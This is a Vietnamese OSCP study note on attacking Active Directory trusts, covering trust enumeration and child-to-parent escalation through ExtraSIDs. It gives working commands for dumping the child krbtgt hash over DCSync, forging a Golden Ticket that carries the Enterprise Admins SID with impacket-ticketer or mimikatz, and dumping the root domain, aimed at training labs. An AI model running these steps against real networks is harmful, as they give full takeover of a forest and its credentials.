# 09 — Domain & Forest Trusts

**Ít gặp trong OSCP chính quy** nhưng xuất hiện trong challenge labs nhiều domain
(và GOAD/Vulnlab). Hiểu cơ bản để không bỏ sót đường đi khi còn domain khác.

---

## 1. Khái niệm

- **Parent–Child** (trong cùng forest, ví dụ `corp.local` ↔ `dev.corp.local`):
  tin cậy **hai chiều, transitive**. Ranh giới bảo mật thật là **forest**, không
  phải domain → chiếm được child thường leo được lên **Enterprise Admins** của parent.
- **Forest trust** (giữa 2 forest): có **SID filtering** mặc định → khó hơn, chỉ
  khai thác được khi cấu hình sai hoặc có đường qua tài khoản/FSP cụ thể.

---

## 2. Enumerate trust

```bash
nxc ldap $DC -u $USER -p $PASS -M enum_trusts
impacket-findDelegation ...                    # đôi khi lộ máy cross-domain
```

```powershell
PS> Get-DomainTrust                             # PowerView
PS> Get-DomainTrustMapping                       # bản đồ toàn bộ
PS> nltest /domain_trusts /all_trusts
PS> Get-ADTrust -Filter *
```

BloodHound hiển thị trust bằng cạnh giữa các node domain → dùng để thấy hướng.

---

## 3. Child → Parent: ExtraSIDs (SID History) — forest hopping

**Giải thích:** Có `krbtgt` của **child domain** (qua DCSync trên DC con) → tạo
Golden ticket có **SID History** = SID của nhóm **Enterprise Admins** của forest
root. Vì trust nội forest không lọc SID này → ticket được chấp nhận trên DC của
parent → chiếm toàn forest.

```bash
# 1) Lấy krbtgt của child + các SID
impacket-secretsdump child.corp.local/$USER:$PASS@$CHILD_DC -just-dc-user krbtgt
impacket-lookupsid child.corp.local/$USER:$PASS@$CHILD_DC          # SID child
#    SID Enterprise Admins của root = <root_domain_SID>-519

# 2) Tạo Golden ticket có ExtraSID của Enterprise Admins
impacket-ticketer -nthash <child_krbtgt_hash> -domain child.corp.local \
  -domain-sid <child_SID> -extra-sid <root_SID>-519 Administrator
export KRB5CCNAME=Administrator.ccache

# 3) Dùng trên DC của parent
impacket-psexec -k -no-pass root-dc.corp.local
impacket-secretsdump -k -no-pass -just-dc root.corp.local
```

Impacket còn có cách tự động hoá toàn bộ (raiseChild):

```bash
impacket-raiseChild child.corp.local/$USER:$PASS      # child admin → Enterprise Admin tự động
```

```powershell
PS> mimikatz # kerberos::golden /user:Administrator /domain:child.corp.local /sid:<child_SID> \
            /krbtgt:<hash> /sids:<root_SID>-519 /ptt
```

**Lab:** GOAD (`sevenkingdoms.local` ↔ `north`/`essos`), Vulnlab *Reflection*,
HTB ProLabs (Dante/Offshore — ngoài phạm vi OSCP nhưng tốt để luyện).

---

## 4. Trust account & foreign group membership

- **Trust key**: giữa 2 domain có một "inter-realm" key → có thể tạo inter-realm
  TGT. Dump được qua DCSync (`-just-dc-user 'CORP$'` dạng trust account).
- **Foreign Security Principals (FSP)**: user của domain A nằm trong nhóm của
  domain B → BloodHound cho thấy đường cross-domain. Kiểm tra:
  ```powershell
  PS> Get-DomainForeignGroupMember -Domain root.corp.local
  ```

---

## 5. Forest trust (khác forest) — lưu ý

- SID filtering chặn kỹ thuật ExtraSID → **không** nhảy forest dễ như child→parent.
- Vẫn có thể: khai thác **đối tượng/credential dùng chung**, **ADCS cross-forest**,
  hoặc service cấu hình trust cụ thể. Trong OSCP gần như không yêu cầu.

## Checklist

- [ ] `Get-DomainTrust` / `nltest /domain_trusts` — còn domain nào?
- [ ] Child domain? → DCSync `krbtgt` child → ticketer `-extra-sid <root>-519`
- [ ] FSP / foreign group membership (BloodHound cross-domain)
- [ ] Mỗi domain mới = lặp lại file 01 → 08
